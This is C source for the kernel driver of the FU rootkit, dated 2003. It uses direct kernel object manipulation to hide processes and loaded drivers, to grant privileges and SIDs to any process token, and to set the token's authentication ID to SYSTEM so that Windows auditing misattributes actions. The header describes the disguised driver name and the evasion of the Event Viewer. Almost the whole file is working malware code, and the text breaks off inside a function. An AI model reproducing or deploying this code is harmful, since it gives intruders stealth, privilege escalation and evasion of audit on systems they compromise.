///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: This driver does all the work of fu.exe. The driver is never unloaded 
//              until reboot. You can use whatever methods you like to load the driver 
//				such as SystemLoadAndCallImage suggested by Greg Hoglund. The driver 
//              is named msdirectx.sys. It is a play on Microsoft's DirectX and is named
//              this to help hide it. (A future tool will hide it completely!) The 
//              driver can change the groups and privileges on any process. It can also 
//              hide a process. Another feature is it can impersonate another logon 
//              session so that Windows Auditing etc. does not know what user really 
//              performed the actions you choose to take with the process. It does all 
//              this by Direct Kernel Object Manipulation (TM). No worries about do I have 
//              permission to that process, token, etc. If you can load a driver once, 
//              you are golden! NOW IT HIDES DRIVERS TOO!
//
// Date:    5/27/2003
// Version: 2.0
//
// Date     7/04/2003   Fixed a problem with a modified token not being inheritable.
//		   12/04/2003   Fixed problem with faking out the Windows Event Viewer.	
//						Cleaned up the code a lot! 
//		   12/05/2003   Now the driver walks the PsLoadedModuleList and removes references 
//                      to the device being hidden. Even after the device is hidden, a user 
//						land process can open a handle to it if its symbolic link name still 
//						exists. Obviously, a stealth driver would not want to create a or it 
//						could delete the symbolic link once it has initialized through the use
//						of an IOCTL.	

#ifdef __cplusplus
extern "C"
{
#endif

#include <ntddk.h>
#include "Driver.h"
#include "stdio.h"
#include "stdlib.h"
#include "Rootkit.h"
#include "ProcessName.h"
#include "ioctlcmd.h"

#ifdef __cplusplus
}
#endif

const WCHAR deviceLinkBuffer[]  = L"\\DosDevices\\rdriv";
const WCHAR deviceNameBuffer[]  = L"\\Device\\rdriv";

void RootkitUnload(IN PDRIVER_OBJECT DriverObject)
{
#ifdef GIVE_OUTPUT
	DbgPrint("FU: Entered RootkitUnload\n");
#endif
	
    UNICODE_STRING          deviceLinkUnicodeString;
	PDEVICE_OBJECT			p_NextObj;

	p_NextObj = DriverObject->DeviceObject;

	if (p_NextObj != NULL)
	{
        // Delete the symbolic link for our device
		//
		RtlInitUnicodeString( &deviceLinkUnicodeString, deviceLinkBuffer );
		IoDeleteSymbolicLink( &deviceLinkUnicodeString );
		// Delete the device object
		//
		IoDeleteDevice( DriverObject->DeviceObject );
//		return STATUS_SUCCESS;
		return;
	}
//	return STATUS_SUCCESS;
	return;
}

NTSTATUS FU_Entry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING RegistryPath)
{
#ifdef GIVE_OUTPUT
	DbgPrint("FU: Entered DriverEntry\n");
#endif
	
    NTSTATUS                ntStatus;
    UNICODE_STRING          deviceNameUnicodeString;
    UNICODE_STRING          deviceLinkUnicodeString;        


	// Setup our name and symbolic link. 
    RtlInitUnicodeString (&deviceNameUnicodeString,
                          deviceNameBuffer );
    RtlInitUnicodeString (&deviceLinkUnicodeString,
                          deviceLinkBuffer );
    // Set up the device
    //
    ntStatus = IoCreateDevice ( DriverObject,
                                0, // For driver extension
                                &deviceNameUnicodeString,
                                FILE_DEVICE_ROOTKIT,
                                0,
                                TRUE,
                                &g_RootkitDevice );

    if(! NT_SUCCESS(ntStatus))
	{
#ifdef GIVE_OUTPUT
        DbgPrint("FU: Failed to create device!\n");
#endif
        return ntStatus;
    }
 
		
	ntStatus = IoCreateSymbolicLink (&deviceLinkUnicodeString,
                                        &deviceNameUnicodeString );
    if(! NT_SUCCESS(ntStatus)) 
	{
		IoDeleteDevice(DriverObject->DeviceObject);
#ifdef GIVE_OUTPUT
        DbgPrint("FU: Failed to create symbolic link!\n");
#endif
        return ntStatus;
    }


    // Create dispatch points for all routines that must be handled
    DriverObject->MajorFunction[IRP_MJ_SHUTDOWN]        =
    DriverObject->MajorFunction[IRP_MJ_CREATE]          =
    DriverObject->MajorFunction[IRP_MJ_CLOSE]           =
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]  = RootkitDispatch;

	// Its extremely unsafe to unload a system-call hooker.
	// Use GREAT caution.
    DriverObject->DriverUnload                          = RootkitUnload;
   
   
	// Get the offset of the process name in the EPROCESS structure.
	gul_ProcessNameOffset = GetLocationOfProcessName(PsGetCurrentProcess());
	if (!gul_ProcessNameOffset)
	{
		IoDeleteSymbolicLink( &deviceLinkUnicodeString );
		// Delete the device object
		IoDeleteDevice( DriverObject->DeviceObject );
		return STATUS_UNSUCCESSFUL;
	}

	gul_PsLoadedModuleList = (PMODULE_ENTRY) FindPsLoadedModuleList(DriverObject);
	if (!gul_PsLoadedModuleList)
	{
		IoDeleteSymbolicLink( &deviceLinkUnicodeString );
		// Delete the device object
		IoDeleteDevice( DriverObject->DeviceObject );
		return STATUS_UNSUCCESSFUL;
	}


    return STATUS_SUCCESS;
}


NTSTATUS 
RootkitDispatch(
    IN PDEVICE_OBJECT DeviceObject, 
    IN PIRP Irp 
    )
{
    PIO_STACK_LOCATION      irpStack;
    PVOID                   inputBuffer;
    PVOID                   outputBuffer;
    ULONG                   inputBufferLength;
    ULONG                   outputBufferLength;
    ULONG                   ioControlCode;
	NTSTATUS				ntstatus;

    //
    // Go ahead and set the request up as successful
    //
    ntstatus = Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    //
    // Get a pointer to the current location in the Irp. This is where
    //     the function codes and parameters are located.
    //
    irpStack = IoGetCurrentIrpStackLocation (Irp);

    //
    // Get the pointer to the input/output buffer and its length
    //
    inputBuffer             = Irp->AssociatedIrp.SystemBuffer;
    inputBufferLength       = irpStack->Parameters.DeviceIoControl.InputBufferLength;
    outputBuffer            = Irp->AssociatedIrp.SystemBuffer;
    outputBufferLength      = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
    ioControlCode           = irpStack->Parameters.DeviceIoControl.IoControlCode;

    switch (irpStack->MajorFunction) {
    case IRP_MJ_CREATE:
        break;

    case IRP_MJ_SHUTDOWN:
        break;

    case IRP_MJ_CLOSE:
        break;

    case IRP_MJ_DEVICE_CONTROL:

        if(IOCTL_TRANSFER_TYPE(ioControlCode) == METHOD_NEITHER) {
            outputBuffer = Irp->UserBuffer;
        }

        // Its a request from rootkit 
        ntstatus = RootkitDeviceControl(	irpStack->FileObject, TRUE,
												inputBuffer, inputBufferLength, 
												outputBuffer, outputBufferLength,
												ioControlCode, &Irp->IoStatus, DeviceObject );
        break;
    }
    IoCompleteRequest( Irp, IO_NO_INCREMENT );
    return ntstatus;   
}


NTSTATUS
RootkitDeviceControl(
    IN PFILE_OBJECT FileObject, 
    IN BOOLEAN Wait,
    IN PVOID InputBuffer, 
    IN ULONG InputBufferLength, 
    OUT PVOID OutputBuffer, 
    IN ULONG OutputBufferLength, 
    IN ULONG IoControlCode, 
    OUT PIO_STATUS_BLOCK IoStatus, 
    IN PDEVICE_OBJECT DeviceObject 
    ) 
{
	NTSTATUS ntStatus;
    //UNICODE_STRING deviceLinkUnicodeString;
	//MODULE_ENTRY m_current;
	PMODULE_ENTRY pm_current;
	//ANSI_STRING ansi_DriverName;
	ANSI_STRING hide_DriverName;
	UNICODE_STRING uni_hide_DriverName;
	int	i_count = 0,   i_numLogs = 0,      find_PID = 0;
	int nluids  = 0, i_PrivCount = 0, i_VariableLen = 0;
	int i_LuidsUsed = 0, luid_attr_count = 0, i_SidCount = 0;
	int i_SidSize = 0, i_spaceNeeded = 0, i_spaceSaved = 0; 
	int i_spaceUsed = 0, sid_count  = 0;
	DWORD eproc      = 0x00000000;
	DWORD start_eproc= 0x00000000;
	DWORD token      = 0x00000000;
	PLIST_ENTRY          plist_active_procs = NULL;
	PLUID_AND_ATTRIBUTES luids_attr = NULL;
	PLUID_AND_ATTRIBUTES luids_attr_orig = NULL;
	PSID_AND_ATTRIBUTES  sid_ptr_old = NULL;

	void *varpart  = NULL, *varbegin = NULL, *psid = NULL;

	DWORD SizeOfOldSids, SizeOfLastSid, d_SidStart;

	IoStatus->Status = STATUS_SUCCESS;
    IoStatus->Information = 0;

    switch ( IoControlCode ) 
	{

	case IOCTL_ROOTKIT_INIT:
		if ((InputBufferLength < sizeof(int) * 8) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		PIDOFFSET       = (int) (*(int *)InputBuffer);
		FLINKOFFSET     = (int) (*((int *)InputBuffer+1));
		AUTHIDOFFSET    = (int) (*((int *)InputBuffer+2));
		TOKENOFFSET     = (int) (*((int *)InputBuffer+3));
		PRIVCOUNTOFFSET = (int) (*((int *)InputBuffer+4));
		PRIVADDROFFSET  = (int) (*((int *)InputBuffer+5));
		SIDCOUNTOFFSET  = (int) (*((int *)InputBuffer+6));
		SIDADDROFFSET   = (int) (*((int *)InputBuffer+7));

	break;

	case IOCTL_ROOTKIT_HIDEME:
		if ((InputBufferLength < sizeof(DWORD)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		find_PID = *((DWORD *)InputBuffer);
		if (find_PID == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
		*((DWORD *)plist_active_procs->Blink) = (DWORD) plist_active_procs->Flink;
		*((DWORD *)plist_active_procs->Flink+1) = (DWORD) plist_active_procs->Blink;
	
	  break;

	case IOCTL_ROOTKIT_LISTPROC:
		if ((OutputBufferLength < PROCNAMEIDLEN) || (OutputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		i_numLogs = OutputBufferLength / PROCNAMEIDLEN;
		if (i_numLogs < 1)
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		find_PID = (DWORD) PsGetCurrentProcessId();
		eproc = FindProcessEPROC(find_PID);

		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		start_eproc = eproc;
		RtlZeroMemory(OutputBuffer, OutputBufferLength);

		for (i_count = 1; i_count <= i_numLogs; i_count++)
		{
			_snprintf((char *)((DWORD)OutputBuffer + ((i_count-1) * PROCNAMEIDLEN)), PROCNAMEIDLEN-1, "%s:%u",(char *) eproc+gul_ProcessNameOffset, *(DWORD *)(eproc+PIDOFFSET));
			IoStatus->Information = (i_count) * PROCNAMEIDLEN;
			plist_active_procs = (LIST_ENTRY *) (eproc+FLINKOFFSET);
			eproc = (DWORD) plist_active_procs->Flink;
			eproc = eproc - FLINKOFFSET;
			if (start_eproc == eproc)
			{
				break;
			}
		}
		
		IoStatus->Status = STATUS_SUCCESS;

		break; 

	case IOCTL_ROOTKIT_SETPRIV:
		if ((InputBufferLength < sizeof(struct _vars)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS *)InputBuffer)->the_PID;
		luids_attr = ((VARS *)InputBuffer)->pluida;
		nluids = ((VARS *)InputBuffer)->num_luids;

		if ((find_PID == 0x00000000) || (luids_attr == NULL) || (nluids == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		token = FindProcessToken(eproc);

		i_PrivCount     = *(PDWORD)(token + PRIVCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		//FindTokenParams(token, &i_PrivCount, (PDWORD)&luids_attr_orig);

		// If the new privilege already exists in the token, just change its Attribute field.
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			for (i_LuidsUsed = 0; i_LuidsUsed < nluids; i_LuidsUsed++)
			{
				if((luids_attr[i_LuidsUsed].Attributes != 0xffffffff) && (memcmp(&luids_attr_orig[luid_attr_count].Luid, &luids_attr[i_LuidsUsed].Luid, sizeof(LUID)) == 0))
				{
					luids_attr_orig[luid_attr_count].Attributes = luids_attr[i_LuidsUsed].Attributes;
					luids_attr[i_LuidsUsed].Attributes = 0xffffffff; // Canary value we will use
				}
			}
		}

		// OK, we did not find one of the new Privileges in the set of existing privileges so we are going to find the
		// disabled privileges and overwrite them.
		for (i_LuidsUsed = 0; i_LuidsUsed < nluids; i_LuidsUsed++)
		{
			if (luids_attr[i_LuidsUsed].Attributes != 0xffffffff)
			{
				for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
				{
					// If the privilege was disabled anyway, it was not necessary and we are going to reuse this space for our 
					// new privileges we want to add. Not all the privileges we request may get added because of space so you
					// should order the new privileges in decreasing order.
					if((luids_attr[i_LuidsUsed].Attributes != 0xffffffff) && (luids_attr_orig[luid_attr_count].Attributes == 0x00000000))
					{
						luids_attr_orig[luid_attr_count].Luid       = luids_attr[i_LuidsUsed].Luid;
						luids_attr_orig[luid_attr_count].Attributes = luids_attr[i_LuidsUsed].Attributes;
						luids_attr[i_LuidsUsed].Attributes          = 0xffffffff; // Canary value we will use
					}
				}
			}
		}

		break;

	case IOCTL_ROOTKIT_SETSID:
		if ((InputBufferLength < sizeof(struct _vars2)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS2 *)InputBuffer)->the_PID;
		psid = ((VARS2 *)InputBuffer)->pSID;
		i_SidSize = ((VARS2 *)InputBuffer)->i_SidSize;

		if ((find_PID == 0x00000000) || (psid == NULL) || (i_SidSize == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);
		i_PrivCount     = *(int *)(token + PRIVCOUNTOFFSET);
		i_SidCount      = *(int *)(token + SIDCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		varbegin        = (PVOID) luids_attr_orig;
		i_VariableLen   = *(int *)(token + PRIVCOUNTOFFSET + 4);
		sid_ptr_old     = *(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET);

		// This is going to be our temporary workspace
		varpart = ExAllocatePool(PagedPool, i_VariableLen);
		if (varpart == NULL)
		{
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		RtlZeroMemory(varpart, i_VariableLen);

		// Copy only the Privileges enabled. We will overwrite the disabled privileges to make room for the new SID
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			if(((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes != SE_PRIVILEGE_DISABLED)
			{
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Luid = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Luid;
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Attributes = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes;
				i_LuidsUsed++;
			}			
		}

		// Calculate the space that we need within the existing token
		i_spaceNeeded = i_SidSize + sizeof(SID_AND_ATTRIBUTES);
		i_spaceSaved  = (i_PrivCount - i_LuidsUsed) * sizeof(LUID_AND_ATTRIBUTES);
		i_spaceUsed   = i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES);

		// There is not enough room for the new SID. Note: I am ignoring the Restricted SID's. They may also
		// be a part of the variable length part.
		if (i_spaceSaved  < i_spaceNeeded)
		{
			ExFreePool(varpart);
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlCopyMemory((PVOID)((DWORD)varpart+i_spaceUsed), (PVOID)((DWORD)varbegin + (i_PrivCount * sizeof(LUID_AND_ATTRIBUTES))), i_SidCount * sizeof(SID_AND_ATTRIBUTES));

		for (sid_count = 0; sid_count < i_SidCount; sid_count++)
		{
			//((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid =  (PSID)((DWORD) sid_ptr_old[sid_count].Sid - ((i_PrivCount * sizeof(LUID_AND_ATTRIBUTES)) - (i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES))) + sizeof(SID_AND_ATTRIBUTES));
			((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid =  (PSID)(((DWORD) sid_ptr_old[sid_count].Sid) - ((DWORD) i_spaceSaved) + ((DWORD)sizeof(SID_AND_ATTRIBUTES)));
			((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Attributes = sid_ptr_old[sid_count].Attributes;
		}

		// Setup the new SID_AND_ATTRIBUTES properly.
		SizeOfLastSid = (DWORD)varbegin + i_VariableLen; 
		SizeOfLastSid = SizeOfLastSid - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[i_SidCount-1].Sid;
		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[i_SidCount].Sid = (PSID)((DWORD)((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[i_SidCount-1].Sid + SizeOfLastSid);
		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[i_SidCount].Attributes = 0x00000007;

		// Copy the old SID's, but make room for the new SID_AND_ATTRIBUTES
		SizeOfOldSids = (DWORD)varbegin + i_VariableLen; 
		SizeOfOldSids = SizeOfOldSids - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[0].Sid;
		RtlCopyMemory((VOID UNALIGNED *)((DWORD)varpart + (i_spaceUsed)+((i_SidCount+1)*sizeof(SID_AND_ATTRIBUTES))), (CONST VOID UNALIGNED *)((DWORD)varbegin+(i_PrivCount*sizeof(LUID_AND_ATTRIBUTES))+(i_SidCount*sizeof(SID_AND_ATTRIBUTES))), SizeOfOldSids); 

		// Copy the new stuff right over the old data
		RtlZeroMemory(varbegin, i_VariableLen);
		RtlCopyMemory(varbegin, varpart, i_VariableLen);

		// Copy the new SID at the end of the old SID's.
		RtlCopyMemory(((PSID_AND_ATTRIBUTES)((DWORD)varbegin+(i_spaceUsed)))[i_SidCount].Sid, psid, i_SidSize);

		// Fix the token back up.
		*(int *)(token + SIDCOUNTOFFSET) += 1;
		*(int *)(token + PRIVCOUNTOFFSET) = i_LuidsUsed;
		*(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET) = (PSID_AND_ATTRIBUTES)((DWORD) varbegin + (i_spaceUsed));
		
		ExFreePool(varpart);
		break;

	case IOCTL_ROOTKIT_SETAUTHID:
		if ((InputBufferLength < sizeof(struct _vars2)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		
		////////////////////////////////////////////////////////////////////////////////////////
		// Some of these are pointers so what they point to may not be paged in, but I don't care. It is 
		// proof of concept code for a reason.
		find_PID = ((VARS2 *)InputBuffer)->the_PID;
		psid = ((VARS2 *)InputBuffer)->pSID;
		i_SidSize = ((VARS2 *)InputBuffer)->i_SidSize;

		if ((find_PID == 0x00000000) || (psid == NULL) || (i_SidSize == 0))
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}
		
		eproc = FindProcessEPROC(find_PID);
		if (eproc == 0x00000000)
		{
			IoStatus->Status = STATUS_INVALID_PARAMETER;
			break;
		}

		token = FindProcessToken(eproc);
		i_PrivCount     = *(int *)(token + PRIVCOUNTOFFSET);
		i_SidCount      = *(int *)(token + SIDCOUNTOFFSET);
		luids_attr_orig = *(PLUID_AND_ATTRIBUTES *)(token + PRIVADDROFFSET);
		varbegin        = (PVOID) luids_attr_orig;
		i_VariableLen   = *(int *)(token + PRIVCOUNTOFFSET + 4);
		sid_ptr_old     = *(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET);

		// This is going to be our temporary workspace
		varpart = ExAllocatePool(PagedPool, i_VariableLen);
		if (varpart == NULL)
		{
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlZeroMemory(varpart, i_VariableLen);

		// Copy only the Privileges enabled. We will overwrite the disabled privileges to make room for the new SID
		for (luid_attr_count = 0; luid_attr_count < i_PrivCount; luid_attr_count++)
		{
			if(((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes != SE_PRIVILEGE_DISABLED)
			{
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Luid = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Luid;
				((PLUID_AND_ATTRIBUTES)varpart)[i_LuidsUsed].Attributes = ((PLUID_AND_ATTRIBUTES)varbegin)[luid_attr_count].Attributes;
				i_LuidsUsed++;
			}			
		}

		// Calculate the space that we need within the existing token
		i_spaceNeeded = i_SidSize + sizeof(SID_AND_ATTRIBUTES);
		i_spaceSaved  = (i_PrivCount - i_LuidsUsed) * sizeof(LUID_AND_ATTRIBUTES);
		i_spaceUsed   = i_LuidsUsed * sizeof(LUID_AND_ATTRIBUTES);

		// There is not enough room for the new SID. Note: I am ignoring the Restricted SID's. They may also
		// be a part of the variable length part.
		if (i_spaceSaved  < i_spaceNeeded)
		{
			ExFreePool(varpart);
			IoStatus->Status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[0].Sid =  (PSID) ((DWORD) varbegin + (i_spaceUsed) + ((i_SidCount+1) * sizeof(SID_AND_ATTRIBUTES)));
		((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[0].Attributes = 0x00000000;

		d_SidStart = ((DWORD) varbegin + (i_spaceUsed) + ((i_SidCount+1) * sizeof(SID_AND_ATTRIBUTES))); 
		for (sid_count = 0; sid_count < i_SidCount; sid_count++)
		{
			if (sid_count == 0)
			{
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Sid =  (PSID) (d_SidStart + i_SidSize); 
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Attributes =  0x00000007;
			}
			else {
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Sid =  (PSID) ((DWORD)sid_ptr_old[sid_count].Sid - (DWORD)sid_ptr_old[sid_count-1].Sid + (DWORD)((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count].Sid); 
				((PSID_AND_ATTRIBUTES)((DWORD)varpart+(i_spaceUsed)))[sid_count+1].Attributes = sid_ptr_old[sid_count].Attributes;
			}
		}
		// Copy the new SID.
		RtlCopyMemory((PVOID) ((DWORD)varpart+(i_spaceUsed) + ((i_SidCount+1) * sizeof(SID_AND_ATTRIBUTES))), psid, i_SidSize);

		// Copy the old SID's, but make room for the new SID_AND_ATTRIBUTES
		SizeOfOldSids = (DWORD)varbegin + i_VariableLen; 
		SizeOfOldSids = SizeOfOldSids - (DWORD)((PSID_AND_ATTRIBUTES)sid_ptr_old)[0].Sid;
#ifdef GIVE_OUTPUT
        DbgPrint("FU: The SizeOfOldSids = %x\n",SizeOfOldSids);
#endif
		RtlCopyMemory((VOID UNALIGNED *)((DWORD)varpart + (i_spaceUsed)+(i_SidCount*sizeof(SID_AND_ATTRIBUTES))+i_spaceNeeded), (CONST VOID UNALIGNED *)((DWORD)varbegin+(i_PrivCount*sizeof(LUID_AND_ATTRIBUTES))+(i_SidCount*sizeof(SID_AND_ATTRIBUTES))), SizeOfOldSids); 

		// Copy the new stuff right over the old data
		RtlZeroMemory(varbegin, i_VariableLen);
		RtlCopyMemory(varbegin, varpart, i_VariableLen);

		// Fix the token back up.
		*(int *)(token + SIDCOUNTOFFSET) += 1;
		*(int *)(token + PRIVCOUNTOFFSET) = i_LuidsUsed;
		*(PSID_AND_ATTRIBUTES *)(token + SIDADDROFFSET) = (PSID_AND_ATTRIBUTES)((DWORD) varbegin + (i_spaceUsed));

		// Set the AUTH_ID in the token to the LUID for the System account.
		*(int *)(token + AUTHIDOFFSET) = SYSTEM_LUID;
			
		ExFreePool(varpart);

	break;

	// This only prints the driver names to the debugger such as Debug View from SysInternals
	case IOCTL_ROOTKIT_LISTDRIV:
		if (gul_PsLoadedModuleList == NULL)
		{
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		pm_current =  gul_PsLoadedModuleList;

		while ((PMODULE_ENTRY)pm_current->le_mod.Flink != gul_PsLoadedModuleList)
		{
#ifdef GIVE_OUTPUT
			DbgPrint("FU: Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
#endif
			// This works on Windows XP SP1 and Windows 2003.
			if ((pm_current->unk1 != 0x00000000) && (pm_current->driver_Path.Length != 0))
			{
#ifdef GIVE_OUTPUT
				DbgPrint("FU: Driver: %ws\n", pm_current->driver_Name.Buffer);
#endif
			}
			pm_current =  (MODULE_ENTRY*)pm_current->le_mod.Flink;
		}

	  break;

  	case IOCTL_ROOTKIT_HIDEDRIV:
		// Do some verification on the input buffer.
		if ((InputBufferLength < sizeof(char)) || (InputBuffer == NULL))
		{
			IoStatus->Status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (gul_PsLoadedModuleList == NULL)
		{
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		hide_DriverName.Length = (USHORT) InputBufferLength;
		hide_DriverName.MaximumLength = (USHORT) InputBufferLength;
		hide_DriverName.Buffer = (PCHAR)InputBuffer;

		ntStatus = RtlAnsiStringToUnicodeString(&uni_hide_DriverName, &hide_DriverName, TRUE);
		if(!NT_SUCCESS(ntStatus)) {
			IoStatus->Status = STATUS_UNSUCCESSFUL;
			break;
		}

		pm_current =  gul_PsLoadedModuleList;

		while ((PMODULE_ENTRY)pm_current->le_mod.Flink != gul_PsLoadedModuleList)
		{
#ifdef GIVE_OUTPUT
			DbgPrint("FU: Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
#endif
			// This works on Windows XP SP1 and Windows 2003.
			if ((pm_current->unk1 != 0x00000000) && (pm_current->driver_Path.Length != 0))
			{
				if (RtlCompareUnicodeString(&uni_hide_DriverName, &(pm_current->driver_Name), FALSE) == 0)
				{
					*((PDWORD)pm_current->le_mod.Blink)        = (DWORD) pm_current->le_mod.Flink;
					pm_current->le_mod.Flink->Blink            = pm_current->le_mod.Blink;
#ifdef GIVE_OUTPUT
					DbgPrint("FU: Just hid %s\n",hide_DriverName.Buffer);
#endif
					break;
				}
//				if (RtlCompareUnicodeString(&uni_hide_DriverName, &(m_current.driver_Name), FALSE) == 0)
//				{
//					*((PDWORD)m_current.le_mod.Blink)        = (DWORD) m_current.le_mod.Flink;
//					m_current.le_mod.Flink->Blink            = m_current.le_mod.Blink;
//					//DbgPrint("Just hid %s\n",hide_DriverName.Buffer);
//					break;
//				}
			}
			pm_current =  (MODULE_ENTRY*)pm_current->le_mod.Flink;
		}

		if( NT_SUCCESS(ntStatus)) {
			RtlFreeUnicodeString(&uni_hide_DriverName);
		}

    break;

	default:
		IoStatus->Status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

    return IoStatus->Status;
}


//////////////////////////////////////////////////////////////////////////////
// Finds and returns the address of the PsLoadedModuleList. This is based on
// the information provided by Edgar Barbosa in his paper "Finding some
// non-exported kernel variables in Windows XP". Works with Windows XP and
// Windows 2003.
DWORD Non2000FindPsLoadedModuleList (void)
{
	DWORD address = 0x00000000;

	__asm {
		mov eax, fs:[0x34]; // Get address of KdVersionBlock
		mov eax, [eax+0x70]; // Get address of PsLoadedModuleList
		mov address, eax;
	}

	return address;
}


DWORD FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject)
{
	PMODULE_ENTRY pm_current;

	if (DriverObject == NULL)
		return 0;

	pm_current = *((PMODULE_ENTRY*)((DWORD)DriverObject + 0x14));
	if (pm_current == NULL)
		return 0;
	
	return (DWORD) pm_current;
//	gul_PsLoadedModuleList = pm_current;
//	while ((PMODULE_ENTRY)pm_current->le_mod.Flink != gul_PsLoadedModuleList)
//	{
//		//DbgPrint("Module at 0x%x unk1 0x%x path.length 0x%x name.length 0x%x\n", pm_current, pm_current->unk1, pm_current->driver_Path.Length, pm_current->driver_Name.Length);
//		// This works on Windows XP SP1 and Windows 2003.
//		if ((pm_current->unk1 == 0x00000000) && (pm_current->driver_Path.Length == 0))
//		{
//			return (DWORD) pm_current;
//		}
//		pm_current =  (MODULE_ENTRY*)pm_current->le_mod.Flink;
//	}
//
//	return 0;
}


DWORD FindProcessToken (DWORD eproc)
{
	DWORD token;

	__asm {
		mov eax, eproc;
		add eax, TOKENOFFSET;
		mov eax, [eax];
		and eax, 0xfffffff8; // Added for XP. See definition of _EX_FAST_REF
		mov token, eax;
	}
	
	return token;
}



//////////////////////////////////////////////////////////////////////////////
// This function was originally written mostly in assembly language. Now let's
// make it readable to the masses.
DWORD FindProcessEPROC (int terminate_PID)
{
	DWORD eproc       = 0x00000000; 
	int   current_PID = 0;
	int   start_PID   = 0; 
	int   i_count     = 0;
	PLIST_ENTRY plist_active_procs;

	if (terminate_PID == 0)
		return terminate_PID;

